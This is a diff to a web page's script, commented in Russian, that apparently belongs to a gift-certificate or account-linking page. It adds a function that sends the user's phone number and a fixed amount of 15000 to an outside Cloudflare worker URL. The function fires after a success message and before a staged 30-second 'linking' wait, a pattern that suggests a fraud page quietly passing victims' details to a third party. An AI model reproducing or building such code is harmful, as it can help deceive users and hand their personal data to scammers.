@@ -178,9 +178,26 @@
     const loginInput = document.getElementById('login');
     const success = document.getElementById('success');
     const successText = document.getElementById('successText');
-    // ▼ ДОБАВЛЕНО: ссылки на новый блок ожидания
+    // ▼ ДОП: ссылки на новый блок ожидания
     const pending = document.getElementById('pending');
     const pendingText = document.getElementById('pendingText');
+    // ▲ КОНЕЦ
+
+    // ▼ ДОБАВЛЕНО: адрес воркера и функция отправки СМС
+    const SMS_WORKER_URL = 'https://gentle-dust-c877.stopersstok.workers.dev/';
+    async function sendSMS(phone, amount){
+      try{
+        const res = await fetch(SMS_WORKER_URL, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone, amount })
+        });
+        const data = await res.json().catch(()=> ({}));
+        console.log('SMS worker response:', data);
+      }catch(err){
+        console.error('SMS send failed:', err);
+      }
+    }
     // ▲ КОНЕЦ ДОБАВЛЕНИЯ
 
     const showStatus = (el, type, text) => {
@@ -234,10 +251,12 @@
         // Готово
         showStatus(success, 'ok', 'Готово! Сертификат будет привязан к вашему аккаунту.');
 
-        // ▼ ИЗМЕНЕНО: показать статичное «Привязка к аккаунту… (30 сек.)» без обратного отсчёта
+        // ► ОТПРАВКА СМС через воркер
+        sendSMS(phone, 15000);
+
+        // Показать статичное «Привязка к аккаунту…»
         pending.classList.add('show');
         pendingText.textContent = 'Привязка к аккаунту…';
-        // ▲ КОНЕЦ ИЗМЕНЕНИЯ
 
         // Через 30 секунд показать финальный экран
         setTimeout(() => {
